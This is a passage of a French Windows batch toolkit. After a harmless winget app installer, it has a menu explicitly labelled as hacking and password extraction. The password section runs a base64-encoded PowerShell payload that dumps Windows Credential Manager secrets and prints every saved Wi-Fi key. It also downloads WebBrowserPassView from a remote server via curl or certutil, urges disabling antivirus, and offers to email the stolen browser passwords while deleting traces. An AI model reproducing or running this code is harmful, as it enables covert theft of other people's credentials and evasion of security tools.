REM              INSTALLATEUR D'APPLICATIONS (WINGET)
REM ===================================================================
:app_installer
set "wg_id="
set "wg_label="
cls
set "opts=[--- NAVIGATEURS ---];Google Chrome~Navigateur web Google"
set "opts=%opts%;[--- MULTIMEDIA ---];VLC Media Player~Lecteur multimedia universel"
set "opts=%opts%;[--- PDF ---];Sumatra PDF~Lecteur PDF ultra-leger et rapide"
set "opts=%opts%;[--- ARCHIVAGE ---];WinRAR~Gestionnaire d'archives RAR/ZIP"

call :DynamicMenu "INSTALLATEUR D'APPLICATIONS - Choisissez une application" "!opts!"
set "app_choice=%errorlevel%"
if "!app_choice!"=="0" goto system_tools

REM Mapping : index selectionnable -> ID Winget + Nom registre
set "wg[1]=Google.Chrome"
set "wg[2]=VideoLAN.VLC"
set "wg[3]=SumatraPDF.SumatraPDF"
set "wg[4]=RARLab.WinRAR"

set "wg_name[1]=Google Chrome"
set "wg_name[2]=VLC Media Player"
set "wg_name[3]=Sumatra PDF"
set "wg_name[4]=WinRAR"

REM Nom exact tel qu'il apparait dans Ajout/Suppression de programmes (registre)
set "wg_reg[1]=Google Chrome"
set "wg_reg[2]=VLC media player"
set "wg_reg[3]=SumatraPDF"
set "wg_reg[4]=WinRAR"

for %%X in (!app_choice!) do (
    set "wg_id=!wg[%%X]!"
    set "wg_label=!wg_name[%%X]!"
    set "wg_reg_name=!wg_reg[%%X]!"
)

if not defined wg_id goto app_installer

cls
echo ================================================
echo   VERIFICATION : !wg_label!
echo ================================================
echo.
echo  [1/2] Verification de l'installation sur ce systeme...

REM Verification via le registre Windows (detecte TOUTES les installations, pas seulement winget)
powershell -NoProfile -Command "$n='!wg_reg_name!'; $paths=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $found=$false; foreach($p in $paths){ if(Get-ItemProperty $p -EA SilentlyContinue | Where-Object {$_.DisplayName -like ('*'+$n+'*')}){$found=$true} }; exit $(if($found){0}else{1})" >nul 2>&1

if !errorlevel! NEQ 0 (
    echo  [ ] !wg_label! n'est pas installe.
    echo.
    echo  [2/2] Installation en cours...
    echo  ------------------------------------------------
    winget install --exact --id "!wg_id!" --accept-package-agreements --accept-source-agreements
    set "inst_err=!errorlevel!"
    echo  ------------------------------------------------
    echo.
    if !inst_err!==0 (
        echo  [OK] !wg_label! installe avec succes !
    ) else (
        echo  [ERREUR] L'installation a echoue. Verifiez votre connexion.
    )
) else (
    echo  [OK] !wg_label! est deja installe.
    echo.
    echo  [2/2] Recherche de mises a jour disponibles...
    echo  ------------------------------------------------
    winget upgrade --exact --id "!wg_id!" --accept-package-agreements --accept-source-agreements
    set "upg_err=!errorlevel!"
    echo  ------------------------------------------------
    echo.
    if !upg_err!==0 (
        echo  [OK] !wg_label! est a jour.
    ) else (
        echo  [INFO] Aucune mise a jour disponible pour !wg_label!.
    )
)
echo.
echo  Retour au menu dans 3 secondes...
timeout /t 3 /nobreak >nul
goto app_installer

:: ===============================================
:: Menu d'extraction de mots de passe
:: ===============================================
:sys_passwords_menu
set "opts=Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump)"
set "opts=%opts%;Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms"
set "opts=%opts%;WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe"

:: Mapping des targets pour gestion des favoris en sous-menu
set "pw_t[1]=dump_credman"
set "pw_t[2]=dump_wifi"
set "pw_t[3]=sys_nirsoft_pw"

:: Marquer les favoris existants dans le sous-menu
set "pw_opts="
set /a pwi=0
for %%O in ("Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump)" "Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms" "WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe") do (
    set /a pwi+=1
    set "is_f=0"
    for %%X in (!pwi!) do set "curr_t=!pw_t[%%X]!"
    for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (if "%%F"=="!curr_t!" set "is_f=1")
    if "!is_f!"=="1" (set "pw_opts=!pw_opts!;(F) %%~O") else (set "pw_opts=!pw_opts!;%%~O")
)
set "pw_opts=!pw_opts:~1!"

call :DynamicMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "%pw_opts%" "NONUMS"
set "pw_choice=%errorlevel%"

if "!pw_choice!"=="0" goto system_tools

if !pw_choice! GEQ 200 (
    set /a t_idx=!pw_choice!-200
    for %%X in (!t_idx!) do call :ToggleFav "!pw_t[%%X]!"
    goto sys_passwords_menu
)

if "!pw_choice!"=="1" goto dump_credman
if "!pw_choice!"=="2" goto dump_wifi
if "!pw_choice!"=="3" goto sys_nirsoft_pw
goto sys_passwords_menu

:dump_credman
cls
echo [OPERATION] Extraction du Credential Manager Windows...
echo [INFO] Demarrage du script (natif, autonome, sans dependance reseau)...
echo.
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand QQBkAGQALQBUAHkAcABlACAAQAAiAA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAEMAcgBlAGQATQBhAG4AIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAEUAbgB0AHIAeQBQAG8AaQBuAHQAPQAiAEMAcgBlAGQARQBuAHUAbQBlAHIAYQB0AGUAVwAiACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ADQAKACAAIAAgACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABDAHIAZQBkAEUAbgB1AG0AZQByAGEAdABlACgAcwB0AHIAaQBuAGcAIABmAGkAbAB0AGUAcgAsACAAaQBuAHQAIABmAGwAYQBnAHMALAAgAG8AdQB0ACAAaQBuAHQAIABjAG8AdQBuAHQALAAgAG8AdQB0ACAASQBuAHQAUAB0AHIAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAEUAbgB0AHIAeQBQAG8AaQBuAHQAPQAiAEMAcgBlAGQARgByAGUAZQAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAA0ACgAgACAAIAAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIAB2AG8AaQBkACAAQwByAGUAZABGAHIAZQBlACgASQBuAHQAUAB0AHIAIABjAHIAZQBkACkAOwANAAoADQAKACAAIAAgACAAWwBTAHQAcgB1AGMAdABMAGEAeQBvAHUAdAAoAEwAYQB5AG8AdQB0AEsAaQBuAGQALgBTAGUAcQB1AGUAbgB0AGkAYQBsACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAA0ACgAgACAAIAAgAHMAdAByAHUAYwB0ACAAQwBSAEUARABFAE4AVABJAEEATAAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAARgBsAGEAZwBzADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAVAB5AHAAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFQAYQByAGcAZQB0AE4AYQBtAGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABDAG8AbQBtAGUAbgB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4AQwBvAG0AVAB5AHAAZQBzAC4ARgBJAEwARQBUAEkATQBFACAATABhAHMAdABXAHIAaQB0AHQAZQBuADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiAFMAaQB6AGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABDAHIAZQBkAGUAbgB0AGkAYQBsAEIAbABvAGIAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAaQBuAHQAIABQAGUAcgBzAGkAcwB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQQB0AHQAcgBpAGIAdQB0AGUAQwBvAHUAbgB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAQQB0AHQAcgBpAGIAdQB0AGUAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFQAYQByAGcAZQB0AEEAbABpAGEAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFUAcwBlAHIATgBhAG0AZQA7AA0ACgAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABMAGkAcwB0ADwAcwB0AHIAaQBuAGcAWwBdAD4AIABHAGUAdABBAGwAbAAoACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdAAgAD0AIABuAGUAdwAgAEwAaQBzAHQAPABzAHQAcgBpAG4AZwBbAF0APgAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgAGkAbgB0ACAAYwBvAHUAbgB0ACAAPQAgADAAOwANAAoAIAAgACAAIAAgACAAIAAgAEkAbgB0AFAAdAByACAAcABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvADsADQAKACAAIAAgACAAIAAgACAAIABiAG8AbwBsACAAbwBrACAAPQAgAEMAcgBlAGQARQBuAHUAbQBlAHIAYQB0AGUAKABuAHUAbABsACwAIAAwACwAIABvAHUAdAAgAGMAbwB1AG4AdAAsACAAbwB1AHQAIABwAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwApADsADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACEAbwBrACkAIAByAGUAdAB1AHIAbgAgAHIAZQBzAHUAbAB0ADsADQAKACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgBbAF0AIABwAHQAcgBzACAAPQAgAG4AZQB3ACAASQBuAHQAUAB0AHIAWwBjAG8AdQBuAHQAXQA7AA0ACgAgACAAIAAgACAAIAAgACAATQBhAHIAcwBoAGEAbAAuAEMAbwBwAHkAKABwAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAsACAAcAB0AHIAcwAsACAAMAAsACAAYwBvAHUAbgB0ACkAOwANAAoAIAAgACAAIAAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoAHYAYQByACAAcAB0AHIAIABpAG4AIABwAHQAcgBzACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGMAcgBlAGQAIAA9ACAAKABDAFIARQBEAEUATgBUAEkAQQBMACkATQBhAHIAcwBoAGEAbAAuAFAAdAByAFQAbwBTAHQAcgB1AGMAdAB1AHIAZQAoAHAAdAByACwAIAB0AHkAcABlAG8AZgAoAEMAUgBFAEQARQBOAFQASQBBAEwAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAdAByAGkAbgBnACAAcABhAHMAcwAgAD0AIAAiACIAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAYwByAGUAZAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQgBsAG8AYgBTAGkAegBlACAAPgAgADAAIAAmACYAIABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiACAAIQA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAGEAcwBzACAAPQAgAE0AYQByAHMAaABhAGwALgBQAHQAcgBUAG8AUwB0AHIAaQBuAGcAVQBuAGkAKABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiACwAIABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiAFMAaQB6AGUAIAAvACAAMgApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHIAZQBzAHUAbAB0AC4AQQBkAGQAKABuAGUAdwAgAHMAdAByAGkAbgBnAFsAXQAgAHsAIABjAHIAZQBkAC4AVABhAHIAZwBlAHQATgBhAG0AZQAgAD8APwAgACIAIgAsACAAYwByAGUAZAAuAFUAcwBlAHIATgBhAG0AZQAgAD8APwAgACIAIgAsACAAcABhAHMAcwAgAD8APwAgACIAIgAgAH0AKQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAEMAcgBlAGQARgByAGUAZQAoAHAAQwByAGUAZABlAG4AdABpAGEAbABzACkAOwANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAcgBlAHMAdQBsAHQAOwANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgAiAEAADQAKAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAPQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAAgACAAIABDAFIARQBEAEUATgBUAEkAQQBMACAATQBBAE4AQQBHAEUAUgAgAC0AIABFAFgAVABSAEEAQwBUAEkATwBOACAAVwBJAE4ARABPAFcAUwAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9ACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAQwB5AGEAbgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoADQAKACQAYwByAGUAZABzACAAPQAgAFsAQwByAGUAZABNAGEAbgBdADoAOgBHAGUAdABBAGwAbAAoACkADQAKAGkAZgAgACgAJABjAHIAZQBkAHMALgBDAG8AdQBuAHQAIAAtAGUAcQAgADAAKQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgAFsAIQBdACAAQQB1AGMAdQBuACAAYwByAGUAZABlAG4AdABpAGEAbAAgAHQAcgBvAHUAdgBlACAAbwB1ACAAYQBjAGMAZQBzACAAcgBlAGYAdQBzAGUALgAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAFIAZQBkAA0ACgB9ACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACQAKAAkAGMAcgBlAGQAcwAuAEMAbwB1AG4AdAApACAAYwByAGUAZABlAG4AdABpAGEAbAAoAHMAKQAgAHQAcgBvAHUAdgBlACgAcwApADoAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABHAHIAZQBlAG4ADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAGMAIABpAG4AIAAkAGMAcgBlAGQAcwApACAAewANAAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIABbACsAXQAgAEMAaQBiAGwAZQAgACAAIAAgACAAIAAgACAAOgAgACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAWQBlAGwAbABvAHcAIAAtAE4AbwBOAGUAdwBsAGkAbgBlADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJABjAFsAMABdAA0ACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAAVQB0AGkAbABpAHMAYQB0AGUAdQByACAAIAA6ACAAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABZAGUAbABsAG8AdwAgAC0ATgBvAE4AZQB3AGwAaQBuAGUAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAGMAWwAxAF0ADQAKACAAIAAgACAAIAAgACAAIAAkAHAAYQBzAHMAIAA9ACAAJABjAFsAMgBdAA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAHAAYQBzAHMAIAAtAG4AZQAgACIAIgApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAATQBvAHQAIABkAGUAIABwAGEAcwBzAGUAIAAgADoAIAAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAFkAZQBsAGwAbwB3ACAALQBOAG8ATgBlAHcAbABpAG4AZQA7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACQAcABhAHMAcwAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABHAHIAZQBlAG4ADQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAAgACAAIAAgAE0AbwB0ACAAZABlACAAcABhAHMAcwBlACAAIAA6ACAAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABZAGUAbABsAG8AdwAgAC0ATgBvAE4AZQB3AGwAaQBuAGUAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACgAbgBvAG4AIABhAGMAYwBlAHMAcwBpAGIAbABlACAALwAgAGMAaABpAGYAZgByAGUAIABzAHkAcwB0AGUAbQBlACkAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKACAAIAAgACAAfQANAAoAfQANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgAD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABDAHkAYQBuAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAWwBOAE8AVABFAF0AIABMAGUAcwAgAG0AbwB0AHMAIABkAGUAIABwAGEAcwBzAGUAIABwAHIAbwB0AGUAZwBlAHMAIAAoAGMAbwBtAHAAdABlAHMAIABNAGkAYwByAG8AcwBvAGYAdAAsACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAARABhAHIAawBHAHIAYQB5AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAIAAgACAAIAAgACAAIABjAGUAcgB0AGkAZgBpAGMAYQB0AHMAKQAgAG4AZQAgAHMAJwBhAGYAZgBpAGMAaABlAG4AdAAgAHAAYQBzACAAZQBuACAAYwBsAGEAaQByAC4AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9ACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAQwB5AGEAbgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoA
echo.
echo --- FIN DE L'EXTRACTION ---
echo.
pause
goto system_tools

:dump_wifi
set "opts=Afficher les mots de passe Wi-Fi a l'ecran;Generer un fichier .txt sur le Bureau"
call :DynamicMenu "MOTS DE PASSE WI-FI (WLAN NETSH)" "%opts%"
set "wifi_choice=%errorlevel%"

if "%wifi_choice%"=="1" goto wifi_view
if "%wifi_choice%"=="2" goto wifi_report
if "%wifi_choice%"=="0" goto system_tools
goto dump_wifi

:wifi_view
cls
echo [OPERATION] Affichage des mots de passe Wi-Fi locaux...
echo.
setlocal enabledelayedexpansion
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
    set "ssid=%%I"
    set "ssid=!ssid:~1!"
    if not "!ssid!"=="" (
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
            set "pwd=%%K"
        )
        set "pwd=!pwd:~1!"
        if "!pwd!"=="" set "pwd=(Aucun / Ouvert)"
        echo Reseau SSID : !ssid!
        echo Mot de pass : !pwd!
        echo ------------------------------------------
    )
)
endlocal
echo.
pause
goto dump_wifi

:wifi_report
cls
set "OUTPUT=%USERPROFILE%\Desktop\Wifi_Mots_de_passe_%RANDOM%.txt"
echo Extraction des mots de passe en cours...
> "%OUTPUT%" echo Mots de passe Wi-Fi exportes - %date% %time%
>> "%OUTPUT%" echo ===============================================
setlocal enabledelayedexpansion
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
    set "ssid=%%I"
    set "ssid=!ssid:~1!"
    if not "!ssid!"=="" (
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
            set "pwd=%%K"
        )
        set "pwd=!pwd:~1!"
        if "!pwd!"=="" set "pwd=(Aucun / Ouvert)"
        >> "%OUTPUT%" echo SSID: !ssid! ^| MDP: !pwd!
    )
)
endlocal
echo.
echo [SUCCES] Rapport exporte sur le Bureau :
echo %OUTPUT%
echo.
pause
goto dump_wifi

:sys_nirsoft_pw
cls
setlocal EnableDelayedExpansion
color 0A
echo ===============================================
echo   Extracteur de mots de passe (Nirsoft)
echo ===============================================
echo.
echo  [i] Cet outil utilise WebBrowserPassView pour recuperer
echo      les identifiants enregistres dans vos navigateurs.
echo.
echo  [!] ATTENTION : Les antivirus (Windows Defender, etc.)
echo      bloquent souvent cet outil car il revele des mots de passe.
echo      Si l'outil se ferme seul, desactivez temporairement votre protection.
echo.

set "WBPV=%SCRIPT_DIR%\WebBrowserPassView.exe"
set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"

REM Verifier credentials pour le mail
set "NIR_MAIL_OK=1"
if not defined SMTP_USER set "NIR_MAIL_OK=0"
if not defined SMTP_PASS set "NIR_MAIL_OK=0"

if "%NIR_MAIL_OK%"=="0" (
    echo  [!] Parametres SMTP non configures dans credentials.txt.
    echo      Le mode Mail sera indisponible.
    echo.
)

REM Telecharger si absent
if not exist "%WBPV%" (
    echo Telechargement de l'utilitaire depuis le serveur...
    curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
    if not exist "%WBPV%" (
        echo [!] ERREUR : Impossible de telecharger WebBrowserPassView.
        echo     Verifiez votre connexion internet ou votre Antivirus.
        pause
        endlocal
        goto system_tools
    )
    timeout /t 1 /nobreak >nul
)

REM Menu de mode d'utilisation
set "opts=Automatique : Sauvegarde Locale~Genere un fichier .txt dans le dossier du script;Automatique : Envoi par Mail~Exporte par email et supprime les traces;Manuel : Ouvrir l'Interface GUI~Lance l'outil graphiquement sans l'automatiser"
call :DynamicMenu "MODE D'UTILISATION - NIRSOFT" "%opts%"
set "nir_choice=%errorlevel%"

if "%nir_choice%"=="0" endlocal & goto system_tools
if "%nir_choice%"=="1" set "NIR_MODE=AUTO_LOCAL"
if "%nir_choice%"=="2" (
    if "%NIR_MAIL_OK%"=="0" (
        echo [!] Erreur : Configuration mail absente.
        pause
        goto sys_nirsoft_pw
    )
    set "NIR_MODE=AUTO_MAIL"
)
if "%nir_choice%"=="3" set "NIR_MODE=MANUAL"

if "!NIR_MODE!"=="MANUAL" (
    echo.
    echo Lancement de WebBrowserPassView...
    start "" "%WBPV%"
    echo.
    echo [i] L'utilitaire est ouvert. Faites vos operations manuellement.
    echo     Le script attend que vous fermiez l'utilitaire pour nettoyer.
    echo.
    :wait_nirsoft
    tasklist /FI "IMAGENAME eq WebBrowserPassView.exe" 2>nul | find /I "WebBrowserPassView.exe" >nul
    if %errorlevel% equ 0 (
        timeout /t 2 /nobreak >nul
        goto wait_nirsoft
    )
    goto nirsoft_cleanup
)

REM --- MODE AUTOMATIQUE ---
:nirsoft_auto_flow
echo.
set "custom_filename="
set /p custom_filename="Nom pour le fichier d'export (ex: mes_passes) : "
if "%custom_filename%"=="" goto nirsoft_auto_flow
set "OUTPUT_FILE=%SCRIPT_DIR%\!custom_filename!.txt"

echo.
echo [1/3] Demarrage de l'utilitaire...
if exist "%SCRIPT_DIR%\WebBrowserPassView.cfg" del /F /Q "%SCRIPT_DIR%\WebBrowserPassView.cfg" >nul 2>&1
start "" "%WBPV%"

echo [2/3] Extraction des donnees (Automation)...
timeout /t 5 /nobreak >nul

REM Utilisation de PowerShell pour l'automatisation Ctrl+A, Ctrl+S
powershell -Command "$o='!OUTPUT_FILE!'; Set-Clipboard -Value $o; $wsh=New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 500; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 300; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('{ENTER}'); Start-Sleep -Milliseconds 1000 } else { Write-Warning 'Fenetre Nirsoft non detectee. Antivirus ?' }"

echo [3/3] Fermeture et nettoyage...
taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

if not exist "!OUTPUT_FILE!" (
    echo.
    echo [!] ERREUR : Le fichier d'export n'a pas ete genere.
    echo     Il est possible que l'Antivirus ait bloque l'extraction.
    pause
    goto nirsoft_cleanup
)

REM Filtrage du contenu pour rendre le texte lisible
